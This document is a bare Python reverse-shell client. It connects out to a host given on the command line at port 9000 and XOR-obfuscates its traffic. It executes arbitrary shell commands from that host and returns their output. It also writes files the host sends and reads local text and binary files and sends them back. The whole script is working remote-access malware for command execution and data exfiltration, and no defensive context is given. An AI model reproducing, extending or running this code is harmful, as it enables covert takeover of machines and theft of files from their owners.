#!/usr/bin/python

from socket import socket, SOCK_STREAM, AF_INET
from subprocess import Popen, PIPE
from sys import exit as sysexit, argv
from time import sleep

def make_en_STDOUT(STDOUT,sock):
	en_STDOUT = bytearray(STDOUT,'UTF-8')
	for i in range(len(en_STDOUT)):
		en_STDOUT[i] ^=0x41
	try:
		sock.send(en_STDOUT)
	except:
		sock.close()
		return 1
	return 0

def make_en_bin_STDOUT(STDOUT):
    if STDOUT:
        en_STDOUT = bytearray(STDOUT)
    else:
        en_STDOUT = bytearray("Command not recognised",'UTF-8')
    for i in range(len(en_STDOUT)):
        en_STDOUT[i] ^=0x41
    return en_STDOUT

def make_en_data(data):
    en_data = bytearray(data)
    for i in range(len(en_data)):
        en_data[i] ^=0x41
    return en_data.decode('UTF-8')

def make_en_bin_data(data):
    en_data = bytearray(data)
    for i in range(len(en_data)):
        en_data[i] ^=0x41
    return en_data

def get_en_data(sock, size):
	data = sock.recv(size)
	return make_en_data(data)

def main():
	try:
		RHOST = argv[1]
		RPORT = 9000
	except:
		print ("Must provide hotst")
		sysexit()
	s = socket(AF_INET, SOCK_STREAM)
	s.connect((RHOST,RPORT))

	while True:
		en_data = get_en_data(s,2048)
		if en_data == 'killMe':
			break
		elif en_data == 'getFile':
			en_data = get_en_data(s,2048)
			try:
				fileToWrite = open(en_data,'w')
				STDOUT = 'fcs'
			except:
				STDOUT = 'fna'
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
			if STDOUT == 'fna':
				continue
			fSize = get_en_data(s,1024)
			en_data = get_en_data(s,int(fSize))
			fileToWrite.write(en_data)
			fileToWrite.close()
			STDOUT = "fsw"
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
		elif en_data == "getBinary":
			en_data = get_en_data(s,1024)
			try:
				binToWrite = open(en_data,'wb')
				STDOUT = 'fcs'
			except:
				STDOUT = 'fna'
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
			if STDOUT == 'fna':
				continue
			bSize = get_en_data(s,1024)
			data = s.recv(int(bSize))
			en_data = make_en_bin_data(data)
			binToWrite.write(en_data)
			binToWrite.close()
			STDOUT = "fsw"
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
		elif en_data == "sendFile":
			en_data = get_en_data(s,1024)
			try:
				fileToSend = open(en_data,'r')
				STDOUT = 'fos'
			except:
				STDOUT = 'fna'
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
			if STDOUT == 'fna':
				continue
			fileCont = fileToSend.read()
			sleep(0.1)
			STDOUT = str(len(fileCont) + 1024)
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
			sleep(0.1)
			STDOUT = fileCont
			fileToSend.close()
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
		elif en_data == "sendBinary":
			en_data = get_en_data(s,1024)
			try:
				binToSend = open(en_data,'rb')
				STDOUT = 'fos'
			except:
				STDOUT = 'fna'
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
			if STDOUT == 'fna':
				continue
			binCont = binToSend.read()
			binToSend.close()
			STDOUT = str(len(binCont) + 1024)
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
			sleep(0.1)
			STDOUT = binCont
			en_STDOUT = make_en_bin_STDOUT(STDOUT)
			try:
				s.send(en_STDOUT)
			except:
				s.close()
				sysexit()
		else:
			comm = Popen(en_data, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
			STDOUT,STDERR = comm.communicate()
			if STDERR:
				en_STDOUT = make_en_STDOUT(STDERR.decode('UTF-8'),s)
			elif STDOUT:
				en_STDOUT = make_en_STDOUT(STDOUT.decode('UTF-8'),s)
			else:
				en_STDOUT = make_en_STDOUT('Command has no output',s)
			if en_STDOUT == 1:
				sysexit()
	s.close()

#Start Here!
if __name__ == "__main__":
    main()
